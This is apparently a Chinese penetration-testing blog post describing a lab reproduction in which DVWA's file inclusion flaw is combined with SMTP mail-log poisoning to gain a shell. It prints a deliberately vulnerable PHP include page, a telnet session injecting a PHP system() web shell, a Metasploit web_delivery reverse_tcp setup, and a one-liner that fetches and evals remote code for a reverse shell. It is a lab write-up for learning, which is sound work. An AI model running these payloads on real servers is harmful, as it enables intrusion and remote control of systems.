---
layout:     post
title:      邮件服务器getshell
date:       2019-1-9
author:     Wh0ale
header-img: img/1.jpg
---

# 0x01环境搭建

测试环境

靶机：kali 安装SMTP服务

靶机IP： 192.168.211.179

安装教程：[https://xz.aliyun.com/t/3799#toc-2](https://xz.aliyun.com/t/3799#toc-2)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz1iaah438j20hq0grq3h.jpg)

**Thunderbird安装**

①

```
sudo apt-get install thunderbird
```

②

1. 从[Thunderbird 下载页](https://getthunderbird.com/)将 Thunderbird 下载到 home 目录中。（这里我下载的是32bit，uname -a查看系统版本）
2. 打开**终端**，进入 home 目录：`cd ~`
3. 提取已下载文件包中的文件：`tar xjf thunderbird-*.tar.bz2`
4. 如果 Thunderbird 已打开，请先关闭它。
5. 要打开 Thunderbird，运行 thunderbird 文件夹中的 thunderbird 脚本：`~/thunderbird/thunderbird`

Thunderbird 随后会启动。您可以在桌面创建启动器来运行该命令。

**邮件服务器设置**

在刚才的链接中我们知道我们需要

```
/etc/hostname	将默认的主机名改为“ignite”
/etc/hosts		127.0.0.1 mail.ignite.lab ignite    设置一个本地服务器hostname=ignite
```

**添加邮件账户**

```
sudo adduser Wh0ale
Wh0ale@mail.ignite.lab
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz1iq7at0gj20rl0hhju9.jpg)

**模拟发送短信**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz1ioa1thij20zg0i0ada.jpg)

**dvwa搭建**

```
uname -a                                                     root@ignite Linux ignite 4.14.0-kali3-686-pae #1 SMP Debian 4.14.17-1kali1 (2018-02-16) i686 GNU/Linux
```

因为kali3默认安装的版本为php.7.0，所以dvwa搭建一直没成功

所以我们进行如下操作

彻底卸载php版本

```bash
sudo aptitude purge `dpkg -l | grep php| awk '{print $2}' |tr "\n" " "`	
```

添加旧源

```bash
echo 'deb http://old.kali.org/kali sana main non-free contrib' >> /etc/apt/sources.list
apt-get update
```

 Debian 下将 PHP 安装入 Apache 2 的例子

```bash
apt-get install php5-common libapache2-mod-php5 php5-cli
```

取得 PHP 附加软件包的列表

```bash
apt-cache search php5
aptitude search php5
aptitude search php5 |grep -i mysql
```

安装 PHP 的 MySQL

```bash
apt-get install php5-mysql php5-curl
```

phpd的问题弄好，接下来直接安装dvwa

```bash
chmod -R 755 /var/www/html/dvwa
```

搭建数据出现如下错误

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz1iyjo400j20ho0920ts.jpg)

**解决**

运行如下命令连接 MySQL ，默认是进入MariaDB，

```sql
mysql -uroot -p 
```

需要注意，此时需要输入的**密码默认是空**，不需要填写，直接Enter跳过即可

进入mysql，并将mysql的密码改为 **password**

```sql
use mysql；
update user set password=PASSWORD('xxxxxx') where User='root'; 
```

接着逐行进行如下命令行操作：

```sql
create user dvwa;
grant all on dvwa.* to dvwa@localhost identified by 'password';
flush privileges;
grant all on dvwa.* to 'dvwa'@'%';
flush privileges;
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz1j2dvjhpj211r0ipwfx.jpg)



# 0x02 实战

存在文件包含漏洞的代码

```php
<?php

if(array_key_exists("rf", $_GET)){
    $page = $_GET['rf'];
    if($page != ''){
        include($page);
    }
}
else{
    echo '<script>window.location.href = "./incfile.php?rf="</script>';
}
?>

<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    </head> 
    <body>
        <center>
            <h2>测试页： rf=include($input);</h2>
            <h3>----测试完毕后请立即删除----</h3>
        </center>
    </body>
</html>
```

**dvwa漏洞页面**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz1j7iua85j211r0bkn05.jpg)



**STMP日志投毒**

```
nmap -p25 192.168.211.179
```



```
telnet 192.168.211.179 25
MAIL FROM:<rrajchandel@gmail.com>
RCPT TO:<?php system($_GET['c']); ?>
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz1k12ugojj20ef067mxn.jpg)

这里遇到了些小问题

第一个是执行`telnet 192.168.211.179 25`的时候，目标有可能开着防火墙导致出现如下报错

```bash
~ # telnet 192.168.211.179 25                                     root@ignite Trying 192.168.211.179...
telnet: Unable to connect to remote host: Connection refused
```

**执行命令**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz1jxapxa8j20yw0k4wga.jpg)



**联合MSF利用**

```bash
use exploit/multi/script/web_delivery
msf exploit (web_delivery)>set target 1
msf exploit (web_delivery)> set payload php/meterpreter/reverse_tcp
msf exploit (web_delivery)> set lhost 192.168.1.109
msf exploit (web_delivery)>set srvport  8888
msf exploit (web_delivery)>exploit
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz1k4p3xwij20gw0nttc7.jpg)



```php
php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.211.179:8888/LkIB45CTfpH'));"
```

执行

```
http://192.168.211.179/dvwa/vulnerabilities/fi/?page=/var/log/mail.log&c=php%20-d%20allow_url_fopen=true%20-r%20%22eval(file_get_contents(%27http://192.168.211.179:8888/LkIB45CTfpH%27));%22
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz1k5to3g5j20zk05mgmz.jpg)

**获得反向shell**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz1k7hpfqqj20ho08eq3u.jpg)

整个复现流程很流畅，一些坑点都写在了上面，通过这篇文章我发现了文件包含漏洞的厉害之处，不仅在于邮件服务器这个姿势，可以和很多漏洞打组合拳,例如session文件包含，php伪协议，phar，还有软链接文件。之后在做渗透测试会多留意这块。





Reference:

[http://www.cnblogs.com/JetpropelledSnake/p/9128613.html](http://www.cnblogs.com/JetpropelledSnake/p/9128613.html)

[https://xz.aliyun.com/t/3799#toc-2](https://xz.aliyun.com/t/3799#toc-2)

